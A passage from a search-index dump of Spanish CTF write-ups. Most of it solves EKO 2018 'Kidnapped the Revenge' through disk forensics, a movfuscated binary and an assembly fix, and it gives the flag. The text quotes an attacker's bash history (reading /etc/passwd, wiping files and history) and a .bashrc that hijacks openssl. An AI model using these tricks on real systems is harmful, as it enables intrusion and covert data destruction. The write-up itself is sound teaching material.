unpackear la parte low con el registro de numero m\u00e1s bajo entre los pares (es decir, entre \nxmm1\n y \nxmm2\n, usaremos \nxmm1\n) y el de n\u00famero m\u00e1s alto para la parte high:\n\n\n\n\npunpcklwd xmm1, xmm9   \npunpckhwd xmm2, xmm9   \npunpcklwd xmm3, xmm9   \npunpckhwd xmm4, xmm9   \npunpcklwd xmm5, xmm9   \npunpckhwd xmm6, xmm9   \npunpcklwd xmm7, xmm9   \npunpckhwd xmm8, xmm9\npunpcklwd xmm10, xmm9\npunpckhwd xmm11, xmm9\n\n\n\n\n\n\nxmm9\n no tiene mucho sentido ponerlo adelante, adem\u00e1s de que parece inconsistente con todas las otras, por lo tanto, cambiemos el orden. y dejemos que la instrucci\u00f3n sea: \n\n\n\n\npunpckhwd xmm11, xmm9\n\n\n\n\n\n\nProbemos. Packemos de double word a word, usando la instrucci\u00f3n \npackusdw\n:\n\n\n\n\npackusdw xmm1, xmm2 \npackusdw xmm3, xmm4 \npackusdw xmm5, xmm6 \npackusdw xmm7, xmm8 \n\n\n\n\nEs decir, que finalmente, el nuevo c\u00f3digo ser\u00eda: \n\n\n; nasm -f elf64 simd.asm; ld -o simd simd.o\nsection     .text\nglobal      _start                              \n\n_start:                                         \n\n    movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n\n\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9\n\n    punpcklwd xmm1, xmm9   \n    punpckhwd xmm2, xmm9   \n    punpcklwd xmm3, xmm9   \n    punpckhwd xmm4, xmm9   \n    punpcklwd xmm5, xmm9   \n    punpckhwd xmm6, xmm9   \n    punpcklwd xmm7, xmm9   \n    punpckhwd xmm8, xmm9\n    punpcklwd xmm10, xmm9\n    punpckhwd xmm11, xmm9\n\n\n    psubw xmm1, xmm10\n    psubw xmm2, xmm11\n    psubw xmm3, xmm10\n    psubw xmm4, xmm11\n    psubw xmm5, xmm10\n    psubw xmm6, xmm11\n    psubw xmm7, xmm10\n    psubw xmm8, xmm11\n\n    packusdw xmm1, xmm2 \n    packusdw xmm3, xmm4 \n    packusdw xmm5, xmm6 \n    packusdw xmm7, xmm8 \n\n\n    movdqu [Parallel_processing], xmm1\n    movdqu [is_much_faster...You_know?], xmm3\n    movdqu [but_sometimes_is_difficult], xmm5\n    movdqu [to_understand_how_it_works.], xmm7\n\n    mov     ecx, Parallel_processing  \n    mov     edx, 0x40\n    mov     ebx,1                               \n    mov     eax,4                               \n    int     0x80                                \n\n    mov     eax,1                               \n    int     0x80                                \n\n\nsection     .data\nParallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e\nis_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e\nbut_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f\nto_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b\nAnyways_I_trust_you... dq 0x1715ABADFACEBABE\nWhats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE \n\n\n\n\nSi compilamos este programa y lo corremos, obtendremos el flag:\n\n\nThe flag is:ona{0db234f102901d6c789c2023A11600022e9fa1c9}", 
            "title": "Kidnapped the Revenge"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#kidnapped", 
            "text": "Category: Miscellaneous  Points: 500/500", 
            "title": "Kidnapped"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#enunciado", 
            "text": "Parece un chiste.. \nEl a\u00f1o pasado me hicieron lo mismo. Me queda tiempo hasta el 28 de septiembre para entregar un trabajo de la misma materia (que recurs\u00e9 ya que nadie pudo ayudarme el a\u00f1o pasado) \"Programaci\u00f3n en assembler\". Ya estoy empezando a sospechar que alguno de ustedes me quiere hacer pasar muchos malos momentos.   En fin.. me pas\u00f3 algo muy parecido al a\u00f1o pasado. Hab\u00eda terminado con el trabajo, estaba por hacer un backup, cuando de repente.. mi pc se volvi\u00f3 loca. Aparecieron archivos, archivos mios se borraron, ahora hay archivos con extensiones \".enc\" ... no entiendo nada.   Por favor, dame una mano con esto. Necesito de una vez por todas terminar esta materia. El que me hizo esto, me dej\u00f3 una nota.. Capaz eso les ayuda? \nLes dejo un pedazo (fijense que pesa solo 15 MB, osea no trabajen sobre esa imagen porque se van a quedar sin lugar) de mi disco. Espero que les sirva de algo. \nGracias", 
            "title": "Enunciado"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#file", 
            "text": "disk img", 
            "title": "File"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#parte-1-desencriptando-files", 
            "text": "El challenge simplemente provee una imagen de un disco. \nPor lo tanto, montemos esta imagen:   sudo mount -o rw file.img /mnt/challenge  Ejecutemos un  ls -R  para ver que files interesantes tenemos:   Parece ser un home directory de alguna distribuci\u00f3n de Linux. Adem\u00e1s, de las carpetas por defecto, parece ser que s\u00f3lo 3 files son interesantes:   play_for_the_key.enc  tarea_secuestrada.asm.zip.enc  nota   La nota, dice:  No es f\u00e1cil terminar esta materia... te habr\u00e1s dado cuenta.. pensaste que como ya te hab\u00eda pasado el a\u00f1o pasado este a\u00f1o no te iba a volver a pasar? jaj, pobre.\n\nConsejo de amigos... aprend\u00e9 un poco m\u00e1s a proteger tu pc... \n\nEl a\u00f1o pasado te ayud\u00e9 bastante.. este a\u00f1o.. estas solito.. solo un consejo te voy a dar si queres volver a obtener tu tarea: \n\n                         Hay veces, que romper es mucho m\u00e1s dificil que aprender a jugar .\n\nEspero que sepas darte cuenta cuando haya que aplicar este principio.\n\nMucha suerte..\nAh, casi me olvidaba, te volv\u00ed a modificar un poco tu tarea asique.. vas a tener que arreglarla otra vez.. \nSaludos  Lo \u00fanico interesante ac\u00e1 parece ser la frase:  \"Hay veces, que romper es mucho m\u00e1s dificil que aprender a jugar\" .  Igulamente por ahora, no parece ser \u00fatil.   Usando el comando  ls , no vamos a listar los archivos ocultos. Si usamos el flag  \"-a\"   vamos a encontrar en el home, un file bastante interesante, el  bash_history  con el siguiente contenido:  whoami\ncd Desktop/\nls\ncat /etc/passwd\nsudo su - \ncd /home/\nsu - eldiegomaradona\nsu - elcharliedelapeople\ncrontab -e \ncd /home/alumno/\ncd facu/\ncd programacion_assembler/\ncd tarea_final/\nvim play_for_key.c\nmovcc play_for_key -o play_for_key\nvim simd.asm\nzip -er tarea_secuestrada.asm.zip simd.asm\nrm -rf simd.asm play_for_key.c\nopenssl enc -aes-256-cbc -in tarea_secuestrada.asm.zip -out tarea_secuestrada.asm.zip.enc\nopenssl enc -aes-256-cbc -in play_for_key -out play_for_key.enc\nrm -rf play_for_key\nrm -rf tarea_secuestrada.asm.zip\nvim nota\ncd ~\nrm .bash*\nlogout  Por lo que vemos, el atacante:   Trat\u00f3 de loguearse con algunos usuarios.  Abri\u00f3 el file de configuraci\u00f3n de los crons, habr\u00e1 modificado algo? (no tenemos nada para confirmarlo).  Cre\u00f3/edit\u00f3 un file llamado play_for_key.c ( vim play_for_the_key.c ).  Lo compilo? Con algo raro? ( movcc play_for_key -o play_for_key ).  Cre\u00f3/edit\u00f3 un file llamado simd.asm, ser\u00e1 la tarea? ( vim simd.asm ) .  Zipea el file con password, y ac\u00e1 podemos confirmar que es la tarea ( zip -er tarea_secuestrada.asm.zip simd.asm ).  Elimina los files con c\u00f3digo fuente ( rm -rf simd.asm play_for_key.c ).  Encripta ambos files, sin proporcionar password! ( ambas lineas de openssl )  Elimina dicho files, es decir, s\u00f3lo deja los encriptados ( ambas lineas de rm )  Elimina todo los files que comiencen con .bash ( rm .bash )   Si tratamos de desencriptar los files de extensi\u00f3n .enc, no vamos a poder ya que nos pide una password. Dado que en los comandos para encriptar los files no se utiliz\u00f3 el flag  \"-k\" , para especificar la password en el comando propiamente, entonces podemos asumir que la password fue ingresada en modo interactivo, y por lo tanto no va a haber registro de ella.  Una de las posibilidades ac\u00e1 seria tratar de bruteforcear la password... Pero en general, al menos desde mi punto de vista, yo har\u00eda esto cuando se me acaban las opciones.   En este caso, podemos ver que se borraron varios archivos. Por lo tanto, podr\u00edamos usar alguna suite de forensia con el objetivo de recuperar los files eliminados, como por ejemplo,  photorec .   Con photorec, se puede recuperar al menos un archivo. Ese archivo, parece ser el  .bashrc  del usuario, y entre sus l\u00edneas, tiene lo siguiente:  # enable some nice features\nopenssl(){\n    ba=$4\n    /usr/bin/openssl $1 $2 $3 $4 $5 $6 -k $(for i in {1..100}; do echo -n ${#ba}; done)\n}  Esto quiere decir que, basicamente, el atacante cre\u00f3 un alias con el mismo nombre que el comando  openssl , redefiniendo su acci\u00f3n. En resumen, lo que esta haciendo eso, es agregar la password de encripci\u00f3n con el flag  \"-k\"  cada vez que se llama al comando  openssl . Dicha password es la longitud del nombre del file pasado por par\u00e1metro, repetido 100 veces. La longitud del string  play_for_the_key  es 16 y de  tarea_secuestrada.asm.zip  es 25. Por lo tanto, los siguientes comandos, vamos a poder desencriptar ambos files:  /usr/bin/openssl enc -d -aes-256-cbc -in tarea_secuestrada.asm.zip.enc -out tarea_secuestrada.asm.zip -k 25252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525\n\n/usr/bin/openssl enc -d -aes-256-cbc -in play_for_the_key.enc -out play_for_the_key -k 16161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616  Tener que la salida de estos comandos deber\u00eda ser almacenada afuera del disco, ya que s\u00f3lo tiene 15 MB", 
            "title": "Parte 1: Desencriptando files"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#parte-2-jugar-a-veces-es-mas-facil", 
            "text": "En este momento tenemos 2 files imporatantes:   play_for_the_key : Un binario de 32 bits. Que cuando lo ejecutamos parece que nos pide respuestas a unas \"preguntas\".    tarea_secuestrada.zip : Un archivo ZIP con password.   En este momento uno podr\u00eda tratar de bruteforcear la password del ZIP quiz\u00e1s usando JTR o Hashcat o cualquier otra tool para crackear password de un ZIP. Pero, dado que existe un binario con un nombre bastante claro, se puede intuir que el camino al menos l\u00f3gico, ser\u00eda tratar de conseguir la key usando dicho binario.", 
            "title": "Parte 2: Jugar, a veces es m\u00e1s facil"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#play-for-the-key", 
            "text": "Cuando ejecutamos el binario, el siguiente mensaje aparece:  Ingresa la respuesta n\u00famero 1:  A esta altura no tenemos ni idea que significa esto. Si empezamos a probar y fallamos, el mensaje  \"Nop!\"  se imprimir\u00e1 en la pantalla. En cambio, si ponemos la respuesta correcta, nos pedir\u00e1 la respuesta a la siguiente pregunta:   Pero \u00bfC\u00f3mo sabemos cuantas pregunta son? \u00bfCu\u00e1l es la repuesta correcta?   Una opci\u00f3n v\u00e1lida en este momento ser\u00eda tratar de reversear el binario y ver qu\u00e9 est\u00e1 haciendo. Para este ejemplo, voy a usar  Binary Ninja . Sin embargo, cuando vamos a ver el graph view del binario, vemos algo bastante extra\u00f1o.. Solo existe un basic block. Si seguimos mirando, vamos a notar que s\u00f3lo hay instrucciones  MOV :   \u00bfQu\u00e9 est\u00e1 pasando?. Si volvemos atr\u00e1s un poco y revisamos otra vez el  bash_history  vamos a darnos cuenta que este binario fue compilado usando un comando llamado  movcc . El primer resultado de la b\u00fasqueda de dicho comando en Google, nos lleva a un github de una tool llamada  movfuscator . Seg\u00fan su documentaci\u00f3n, esta compila un c\u00f3digo fuente en un binario de s\u00f3lo instrucciones  MOV . Si bien desde un punto de performance y hasta de espacio que ocupa dicho binario, es bastante malo, al estar escrito s\u00f3lo con instrucciones  MOV  el reversing de este binario se vuelve muchisimo m\u00e1s tedioso.   Y aqu\u00ed se abren dos caminos:\n1. Encontramos una tool para de-movfuscar el binario.\n2. Hacemos uso del msj de la nota, y JUGAMOS en vez de tratar de romper el juego.   Vamos a ir por la opci\u00f3n 2:   Luego de probar un poco con algunos valores que ingresamos como respuestas, vamos a notar que:\n1. Para 1, la respuesta es 1.\n2. Para 2, la respuesta es 2. \n3. Para 3, la respuesta es 1. \n4. Para 4, la respuesta es 1.\n5. Para 5, la respuesta es 2.\n6. Para 6, la respuesta es 1. \n7. Para 7, la respuesta es 2.\n8. Para 8, la respuesta es 1. \n9. Para 9, la respuesta es 2.\n10. Para 10, la respuesta es 3. \n11. Para 11, la respuesta es 4.\n12. Para 12, la respuesta es 1.  Si observamos con detalle, podemos ver que el la respuesta es un numero que empieza a aumentar pero en ciertos valores vuelve a uno. Dichos valores son: 2, 3, 5, 7, 11, etc.  Es decir, parece ser un contador que cuando el n\u00famero de la pregunta es uno de esos, el contador se resetea y vuelve a empezar de 1.  Pero \u00bfQu\u00e9 tienen de com\u00fan estos n\u00fameros?  SON PRIMOS!!  Todav\u00eda no sabemos qu\u00e9 cantidad de preguntas hay, pero igualmente, podemos hacer un script que imprima un contador y que cada vez que se cruza con un n\u00famero primo, vuelva a 1. Dado que no sabemos la cantidad, podemos ir probando hasta que la encontremos. Yo arranqu\u00e9 con 15, y faltaban mas. Mi siguiente paso fue probar con 1000, y funcion\u00f3. La cantidad de preguntas finalmente eran 100.", 
            "title": "Play for the key"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#solucionador", 
            "text": "primos = []\ncontador = 1\nnumero_de_pregunta = 1\nposible_numero_de_preguntas = 1000\nfor numero_de_pregunta in xrange(1,posible_numero_de_preguntas):\n        print contador\n        if any((numero_de_pregunta % primo) == 0 for primo in primos) or numero_de_pregunta == 1:\n                contador += 1\n        else:\n                contador = 1\n                primos.append(numero_de_pregunta)", 
            "title": "Solucionador"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#intento-con-15-primos", 
            "text": "", 
            "title": "Intento con 15 primos"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#intento-con-1000-primos", 
            "text": "Si intentamos descomprimir el ZIP con esa clave, vamos a obtener un \u00faltimo file  simd.asm , que es la \u00faltima parte del challenge.", 
            "title": "Intento con 1000 primos"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#parte-3-programacion-en-assembler", 
            "text": "La \u00faltima parte del challenge implica tratar de entender qu\u00e9 hizo el atacante (qu\u00e9 modific\u00f3) para poder volver hacer que funcione otra vez.   El file original contiene:   nasm -f elf64 simd.asm; ld -o simd simd.o\nsection     .text\nglobal      _start                              \n\n_start:                                         \n\n    movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9\n\n    punpckhwd xmm1, xmm9   \n    punpckhwd xmm2, xmm9   \n    punpcklwd xmm3, xmm9   \n    punpckhwd xmm4, xmm9   \n    punpcklwd xmm5, xmm9   \n    punpcklwd xmm6, xmm9   \n    punpcklwd xmm7, xmm9   \n    punpckhwd xmm8, xmm9\n    punpcklwd xmm10, xmm9\n    punpckhwd xmm9 ,xmm11\n\n\n    psubw xmm1, xmm10\n    psubw xmm2, xmm11\n    psubw xmm3, xmm10\n    psubw xmm4, xmm11\n    psubw xmm5, xmm10\n    psubw xmm6, xmm11\n    psubw xmm7, xmm10\n    psubw xmm8, xmm11\n\n    packuswb xmm1, xmm2 \n    packuswb xmm3, xmm4 \n    packuswb xmm5, xmm6 \n    packuswb xmm7, xmm8 \n\n\n    movdqu [Parallel_processing], xmm1\n    movdqu [is_much_faster...You_know?], xmm3\n    movdqu [but_sometimes_is_difficult], xmm5\n    movdqu [to_understand_how_it_works.], xmm7\n\n    mov     ecx, Parallel_processing  \n    mov     edx, 0x40\n    mov     ebx,1                               \n    mov     eax,4                               \n    int     0x80                                \n\n    mov     eax,1                               \n    int     0x80                                \n\n\nsection     .data\nParallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e\nis_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e\nbut_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f\nto_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b\nAnyways_I_trust_you... dq 0x1715ABADFACEBABE\nWhats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE   Lo m\u00e1s imporante ac\u00e1 es entender qu\u00e9 est\u00e1 haciendo este c\u00f3digo, al menos una idea a alto nivel para despu\u00e9s ahondar en cada detalle. \nDividamos el c\u00f3digo en partes:", 
            "title": "Parte 3: Programaci\u00f3n en assembler"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-1", 
            "text": "movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9  En esta parte, simplemente est\u00e1 copiando el contenido de las etiquetas a los registros XMM (16 bytes). Luego, hace una de cada una de ellos, dejando el mismo contenido de a pares. Es decir,  xmm1  tiene el mismo valor que  xmm2 ,  xmm3  el mismo que  xmm4 , etc.. Por \u00faltimo,  xmm9  lo pone en 0.", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 1"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-2", 
            "text": "punpckhwd xmm1, xmm9   \npunpckhwd xmm2, xmm9   \npunpcklwd xmm3, xmm9   \npunpckhwd xmm4, xmm9   \npunpcklwd xmm5, xmm9   \npunpcklwd xmm6, xmm9   \npunpcklwd xmm7, xmm9   \npunpckhwd xmm8, xmm9\npunpcklwd xmm10, xmm9\npunpckhwd xmm9 ,xmm11  En esta segunda parte, se puede observar dos instrucciones distintas:   punpckhwd    punpcklwd  \u00c9stas, son parte de un conjunto de instrucciones (SSE) usados para procesamiento paralelo. \nGoogleando un poco, se puede encontrar que la funci\u00f3n  punpckhwd  divide los registros, tanto fuente como destino, en words (2 bytes) (por eso la ante \u00faltima letra,  w ). Toma las words que est\u00e1n en la parte high (por eso la letra  h  antes de la  w ) de ambos registros, y los intercala.   Lo imporante de esta parte, no es tanto entrar en detalle de c\u00f3mo es que se intercalan estrictamente, sino m\u00e1s que nada entender que:    Se est\u00e1 unpackeando words  Se est\u00e1 unpackeando o bien la parte high, o bien la parte low.  Casi  todas ellas se est\u00e1n unpackeando con 0 ( xmm9  es 0).   Si recordamos lo que se hizo en la primera parte, hab\u00eda pares de registros  xmm  que tenian el mismo valor. Si bien vemos casos en la parte 2, donde se est\u00e1 unpackeando la parte high y low de un mismo valor de registros (por ejemplo, para  xmm3  y  xmm4 ), tambi\u00e9n vemos casos donde se hace dos veces la parte high ( xmm1  y  xmm2 ). Raro..  Adem\u00e1s, vemos que la \u00faltima intrucci\u00f3n, parece unpackear al rev\u00e9s, es decir, usando el  xmm9  como registro fuente y no como destino. Otra cosa para anotar.", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 2"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-3", 
            "text": "psubw xmm1, xmm10\npsubw xmm2, xmm11\npsubw xmm3, xmm10\npsubw xmm4, xmm11\npsubw xmm5, xmm10\npsubw xmm6, xmm11\npsubw xmm7, xmm10\npsubw xmm8, xmm11  Otra instrucci\u00f3n del mismo set de procesamiento paralelo. En este caso esta instrucci\u00f3n hace una resta word a word de cada registro y almacena el resultado en el registro destino.   Obsevado este pedazo de c\u00f3digo, se puede intuir que ni  xmm11  ni  xmm10  son usados dos veces con el mismo par de registros. Es decir, todo par de registros usa una vez  xmm10  y una vez  xmm11 . \nDe hecho, por el orden y lo n\u00fameros de regitros, podr\u00edamos llegar a pensar que  xmm10  es siempre usado para la parte  low  de los pares de registros y  xmm11  para la parte  high .", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 3"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-4", 
            "text": "packuswb xmm1, xmm2 \npackuswb xmm3, xmm4 \npackuswb xmm5, xmm6 \npackuswb xmm7, xmm8   Por \u00faltimo, en esta parte, se hace el packeo otra vez para volver a la \"normalidad\". Cada par de registros, se packean juntos. \nSin embargo, dicho packeo, se hace de word a byte (por eso  wb  a lo \u00faltimo) cuando el unpackeo se hizo de word a double word... raro..", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 4"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-5", 
            "text": "movdqu [Parallel_processing], xmm1\nmovdqu [is_much_faster...You_know?], xmm3\nmovdqu [but_sometimes_is_difficult], xmm5\nmovdqu [to_understand_how_it_works.], xmm7  Se escribe dichas posiciones de memoria el valor que tienen algunos (los representantes de cada par?) de los  xmm  despu\u00e9s de hacer las operaciones.", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 5"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-parte-6", 
            "text": "mov     ecx, Parallel_processing  \nmov     edx, 0x40\nmov     ebx,1                               \nmov     eax,4                               \nint     0x80                                \n\nmov     eax,1                               \nint     0x80                                  Finalmente, imprime por pantalla los 64 bytes que tenga la posici\u00f3n de memoria apuntada por la etiqueta  Parallel_processing .", 
            "title": "An\u00e1lisis de c\u00f3digo - Parte 6"
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/#analisis-de-codigo-resumen", 
            "text": "Hay al menos 3 cosas que parecen raras:    En el momemto de unpackear, hay algunos pares de registros que se unpackea la misma parte (high o low).   En una instrucci\u00f3n de unpackeo, se usa el  xmm9  como registro destino (no consistente con todo lo anterior).  En el momento de packear, si bien se hab\u00eda unpackeado de word a double word, se packea de word a byte.   Al ser un ejercicio de \"patching\", no queda otra que ir probando los cambios a ver como afectan. Igualmente, as\u00ed como fuimos intuyendo a lo largo del texto, podr\u00edamos hacer los cambios para l\u00f3gicos:   Cada par deberia unpackear la parte low y la parte high. C\u00f3mo saber cual deber\u00eda, podr\u00edamos probar. Sin embargo, por c\u00f3mo est\u00e1 escrito el c\u00f3digo, vamos a optar por unpackear la parte low con el registro de numero m\u00e1s bajo entre los pares (es decir, entre  xmm1  y  xmm2 , usaremos  xmm1 ) y el de n\u00famero m\u00e1s alto para la parte high:   punpcklwd xmm1, xmm9   \npunpckhwd xmm2, xmm9   \npunpcklwd xmm3, xmm9   \npunpckhwd xmm4, xmm9   \npunpcklwd xmm5, xmm9   \npunpckhwd xmm6, xmm9   \npunpcklwd xmm7, xmm9   \npunpckhwd xmm8, xmm9\npunpcklwd xmm10, xmm9\npunpckhwd xmm11, xmm9   xmm9  no tiene mucho sentido ponerlo adelante, adem\u00e1s de que parece inconsistente con todas las otras, por lo tanto, cambiemos el orden. y dejemos que la instrucci\u00f3n sea:    punpckhwd xmm11, xmm9   Probemos. Packemos de double word a word, usando la instrucci\u00f3n  packusdw :   packusdw xmm1, xmm2 \npackusdw xmm3, xmm4 \npackusdw xmm5, xmm6 \npackusdw xmm7, xmm8   Es decir, que finalmente, el nuevo c\u00f3digo ser\u00eda:   ; nasm -f elf64 simd.asm; ld -o simd simd.o\nsection     .text\nglobal      _start                              \n\n_start:                                         \n\n    movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n\n\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9\n\n    punpcklwd xmm1, xmm9   \n    punpckhwd xmm2, xmm9   \n    punpcklwd xmm3, xmm9   \n    punpckhwd xmm4, xmm9   \n    punpcklwd xmm5, xmm9   \n    punpckhwd xmm6, xmm9   \n    punpcklwd xmm7, xmm9   \n    punpckhwd xmm8, xmm9\n    punpcklwd xmm10, xmm9\n    punpckhwd xmm11, xmm9\n\n\n    psubw xmm1, xmm10\n    psubw xmm2, xmm11\n    psubw xmm3, xmm10\n    psubw xmm4, xmm11\n    psubw xmm5, xmm10\n    psubw xmm6, xmm11\n    psubw xmm7, xmm10\n    psubw xmm8, xmm11\n\n    packusdw xmm1, xmm2 \n    packusdw xmm3, xmm4 \n    packusdw xmm5, xmm6 \n    packusdw xmm7, xmm8 \n\n\n    movdqu [Parallel_processing], xmm1\n    movdqu [is_much_faster...You_know?], xmm3\n    movdqu [but_sometimes_is_difficult], xmm5\n    movdqu [to_understand_how_it_works.], xmm7\n\n    mov     ecx, Parallel_processing  \n    mov     edx, 0x40\n    mov     ebx,1                               \n    mov     eax,4                               \n    int     0x80                                \n\n    mov     eax,1                               \n    int     0x80                                \n\n\nsection     .data\nParallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e\nis_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e\nbut_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f\nto_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b\nAnyways_I_trust_you... dq 0x1715ABADFACEBABE\nWhats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE   Si compilamos este programa y lo corremos, obtendremos el flag:  The flag is:ona{0db234f102901d6c789c2023A11600022e9fa1c9}", 
            "title": "An\u00e1lisis de c\u00f3digo - Resumen"
        }, 
        {
            "location": "/ctfs/own/eko2019/secret_spy_message/", 
            "text": "Secret Spy Message\n\n\nDescription\n\n\n\n\nCategory:\u00a0Steganography\u00a0\n\n\nPoints:\u00a0100\u00a0/\u00a0500\u00a0\n\n\nGoal:\u00a0Fun\u00a0and\u00a0learn\u00a0about\u00a0DTMF\n\n\n\n\nStatement\n\n\nOur\u00a0secret\u00a0spy\u00a0has\u00a0recorded\u00a0something\u00a0that\u00a0seems\u00a0useful\u00a0but\u00a0we\u00a0don't\u00a0know\u00a0how!\u00a0Can\u00a0you\u00a0help\u00a0us?\u00a0\nThe\u00a0flag\u00a0is:\u00a0ONA{sha1(password)}\n\n\n====\n\n\nNuestro\u00a0esp\u00eda\u00a0secreto\u00a0grab\u00f3\u00a0algo\u00a0que\u00a0parece\u00a0ser\u00a0\u00fatil\u00a0pero\u00a0no\u00a0sabemos\u00a0c\u00f3mo\u00a0utilizarlo!\u00a0Nos\u00a0ayud\u00e1s?\nEl\u00a0flag\u00a0es:\u00a0ONA{sha1(password)}\n\n\nFile\n\n\naudio.wav\n\n\nSolution\n\n\nThis\u00a0challenge\u00a0was\u00a0built\u00a0with\u00a0the\u00a0goal\u00a0of\u00a0having\u00a0some\u00a0fun.\u00a0It\u00a0didn't\u00a0require\u00a0knowledge\u00a0but\u00a0just\u00a0a\u00a0little\u00a0bit\u00a0of\u00a0googling\u00a0and\u00a0the\u00a0correct\u00a0tools.\u00a0\n\n\nThe\u00a0file\u00a0provided\u00a0is\u00a0a\u00a0\n.wav\n\u00a0file\u00a0(audio)\u00a0with\u00a0some\u00a0noises.\u00a0If\u00a0you\u00a0listen\u00a0for\u00a0a\u00a0couple\u00a0of\u00a0secs\u00a0the\u00a0audio\u00a0you'll\u00a0notice\u00a0that\u00a0sound\u00a0is\u00a0familiar.\u00a0Seems\u00a0to\u00a0be\u00a0the\u00a0sound\u00a0made\u00a0by\u00a0a\u00a0phone\u00a0when\u00a0you're\u00a0dialing.\u00a0\nIt\u00a0could\u00a0be\u00a0possible\u00a0to\u00a0know\u00a0what\u00a0was\u00a0dialed?\n\n\nWell,\u00a0this\u00a0sound\u00a0is\u00a0not\u00a0other\u00a0than\u00a0the\u00a0signal\u00a0being\u00a0sent\u00a0through\u00a0the\u00a0telecommunication\u00a0channel.\u00a0With\u00a0some\u00a0googling\u00a0you\u00a0can\u00a0find\u00a0that\u00a0this\u00a0type\u00a0of\u00a0encoding\u00a0is\u00a0called\u00a0DTMF.\u00a0\n\n\nSo\u00a0now\u00a0we\u00a0have\u00a0an\u00a0audio\u00a0of\u00a0DTMF\u00a0tones\u00a0that\u00a0we\u00a0want\u00a0to\u00a0decode\u00a0(we\u00a0want\u00a0to\u00a0get\u00a0the\u00a0key\u00a0that\u00a0was\u00a0pressed\u00a0from\u00a0its\u00a0sound).\n\n\nThe\u00a0following\u00a0table\u00a0can\u00a0be\u00a0found\u00a0in\u00a0this\u00a0\nlink\n:\n\n\n\nIt\u00a0depicts\u00a0the\u00a0combination\u00a0of\u00a0frequencies\u00a0for\u00a0each\u00a0of\u00a0the\u00a0different\u00a0numbers.\n\n\nTherefore,\u00a0we\u00a0could\u00a0analyze\u00a0the\u00a0frequency\u00a0spectrum\u00a0of\u00a0the\u00a0audio\u00a0with\u00a0some\u00a0tool\u00a0(like\u00a0Au